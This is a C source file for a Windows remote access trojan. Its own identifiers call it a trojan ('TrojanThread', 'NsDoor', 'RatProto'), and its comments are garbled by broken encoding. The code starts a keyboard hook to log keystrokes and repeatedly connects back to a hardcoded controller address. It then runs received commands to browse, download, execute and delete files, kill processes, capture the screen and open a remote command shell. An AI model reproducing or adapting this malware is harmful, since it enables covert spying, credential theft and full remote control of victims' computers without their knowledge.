#pragma once
#include "Header.h"
#include "RatProto.h"
#include "SysInfo.h"
#include "ProcInfo.h"
#include "RemoteCmd.h"
#include "FileMgr.h"
#include "DeskView.h"
#include "KeyBoard.h"

//////////////////////////////////////////////////////////////////////////
//�궨�岿��
//////////////////////////////////////////////////////////////////////////
char szRecvCmd[MAXLENGTH] = {0};
char szSendCmd[MAXLENGTH] = {0};
int dwRecvSize = 0;
int dwSendSize = 0;
STARTHOOK StartHook = NULL;
STOPHOOK  StopHook = NULL;
GETTEXT	 GetText   = NULL;

void main(int argc, char* argv[]) 
{
	HMODULE hModule = LoadLibrary("HookLib.dll");
	if (hModule)
	{
		StartHook = (STARTHOOK)GetProcAddress(hModule,"StartHook");
		StopHook = (STOPHOOK)GetProcAddress(hModule,"StopHook");
		GetText  = (GETTEXT)GetProcAddress(hModule,"GetText");
		if (StopHook && StartHook && GetText)
		{
			StartHook();
		}
	}
	//����һ��ľ���߳�
	CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)TrojanThread,NULL,NULL,NULL);

	while (TRUE)
	{
		Sleep(1000);
	}
}


int ServiceMain()
{
	SERVICE_TABLE_ENTRY ServiceTable[2];
	ServiceTable[0].lpServiceName = "NsDoor";
	ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

	ServiceTable[1].lpServiceName = NULL;
	ServiceTable[1].lpServiceProc = NULL;

	// ��������Ŀ��Ʒ��ɻ��߳�
	StartServiceCtrlDispatcher(ServiceTable); 


	return 0;
}

//////////////////////////////////////////////////////////////////////////
//ľ���߳�
//////////////////////////////////////////////////////////////////////////
void TrojanThread(void)
{
	//���ӿͻ���
	SOCKET sockfd = ConnClient();

	while (TRUE)
	{
		//����һ����
		BOOL flag = RecvCmd(sockfd);
		if (flag)
		{
			flag = DispatchCmd(sockfd,dwRecvSize);
			dwRecvSize = 0;
		}
		if (!flag)
		{
			SocketError(sockfd);
		}
	}
}






//////////////////////////////////////////////////////////////////////////
//���ӿͻ���
//////////////////////////////////////////////////////////////////////////
SOCKET ConnClient(void)
{
	WSADATA wsa;
	WSAStartup(MAKEWORD(2,2),&wsa);

	SOCKADDR_IN sin;
	sin.sin_addr.s_addr = inet_addr(DESTIP);
	sin.sin_port = htons(DESTPORT);
	sin.sin_family = AF_INET;
	SOCKET sockfd = socket(AF_INET,SOCK_STREAM,NULL);

	while (TRUE)
	{
		Sleep(100);
		int nRet = connect(sockfd,(LPSOCKADDR)&sin,sizeof(sin));
		if (nRet!=SOCKET_ERROR)
		{
			break;
		}
	}

	return sockfd;
}


//////////////////////////////////////////////////////////////////////////
//��������
//////////////////////////////////////////////////////////////////////////
BOOL RecvCmd(SOCKET sockfd)
{
	dwRecvSize = 0;
	//�������ݰ�ͷ
	BOOL flag = RecvData(sockfd,szRecvCmd,sizeof(RatProto));
	if (!flag)
	{
		return FALSE;
	}
	else if (sizeof(RatProto) > ((RatProto*)szRecvCmd)->RatLen)
	{
		return FALSE;
	}
	//��������
	int dwSize = ((RatProto*)szRecvCmd)->RatLen - sizeof(RatProto);
	if (dwSize)
	{
		char* pData = szRecvCmd + sizeof(RatProto);
		flag = RecvData(sockfd,pData,dwSize);
		if (!flag)
		{
			return FALSE;
		}
	}
	dwRecvSize = ((RatProto*)szRecvCmd)->RatLen;

	return TRUE;
}



//////////////////////////////////////////////////////////////////////////
//SOCKET ERROR
//////////////////////////////////////////////////////////////////////////
BOOL SocketError(SOCKET sockfd)
{
	//TODO...
	dwSendSize = dwRecvSize = 0;
	closesocket(sockfd);
	//���¿�һ��ľ���߳�
	CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)TrojanThread,NULL,NULL,NULL);
	
	ExitThread(NULL);

	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//���ƽ��չ̶���������
//////////////////////////////////////////////////////////////////////////
BOOL RecvData(SOCKET sockfd,char* pData,int dwSize)
{
	while (TRUE)
	{
		fd_set fdset;
		fdset.fd_count = 1;
		fdset.fd_array[0] = sockfd;
		int nRet = select(NULL,&fdset,NULL,NULL,NULL);
		if (nRet == SOCKET_ERROR)
		{
			return FALSE;
		}
		else
		{
			nRet = recv(sockfd,pData,dwSize,NULL);
			if (nRet==SOCKET_ERROR || !nRet)
			{
				return FALSE;
			}
		}
		if (nRet < dwSize)
		{
			pData += nRet;
			dwSize -= nRet;
		}
		else
		{
			break;
		}
	}

	return TRUE;
}




//////////////////////////////////////////////////////////////////////////
//���ַ�����
//////////////////////////////////////////////////////////////////////////
BOOL DispatchCmd(SOCKET sockfd,int dwSize)
{
	switch (((RatProto*)szRecvCmd)->RatId)
	{
	case FILE_VIEW:
		{
			//���̷�
			DriveList(sockfd);
		}
		break;
	case FILE_OPEN:
		{
			//��ָ���ļ�
			FileOpen(sockfd,dwSize);
		}
		break;
	case FILE_EXCUTE:
		{
			//ִ��EXE�ļ�
			FileExcute(sockfd,dwSize);
		}
		break;
	case FILE_BACK:
		{
			//�ļ��л���
			FileBack(sockfd,dwSize);
		}
		break;
	case FILE_DELETE:
		{
			//ɾ���ļ�
			FileDelete(sockfd,dwSize);
		}
		break;
	case FILE_DOWNLOAD:
		{
			//�����ļ�
			FileDownload(sockfd,dwSize);
		}
		break;
	case PROC_VIEW:
		{
			//PROCVIEW����
			ProcView(sockfd,dwSize);
		}
		break;
	case PROC_DELETE:
		{
			//ɾ��PIDָ������
			ProcDelete(sockfd,dwSize);
		}
		break;
	case DESK_VIEW:
		{
			//Զ�����沶��
			DeskView(sockfd);
		}
		break;
	case CMD_REQUSET:
		{
			//��ӦCMD��Ϣ
			CmdReply(sockfd,dwSize);
		}
		break;
	case KEY_OK:
		{
			//�������̼��
			Start2Hook(sockfd);
		}
		break;
	case KEY_CANCEL:
		{
			//�رռ��̼��
			Stop2Hook(sockfd);
			
		}
		break;
	case SYS_VIEW:
		{
			//SYSINFO��غ���
			SysView(sockfd,dwSize);
		}
		break;
	default:
		return FALSE;
	}

	return TRUE;
}


//////////////////////////////////////////////////////////////////////////
//��������
//////////////////////////////////////////////////////////////////////////
BOOL SendCmd(SOCKET sockfd,char* pData,int dwSize)
{
	int nRet = send(sockfd,pData,dwSize,NULL);
	//ȫ��ʹ��malloc����,���ͷ�
	//free(pData);
	if (nRet == SOCKET_ERROR)
	{
		SocketError(sockfd);
		return FALSE;
	}
	else
	{
		return TRUE;
	}
}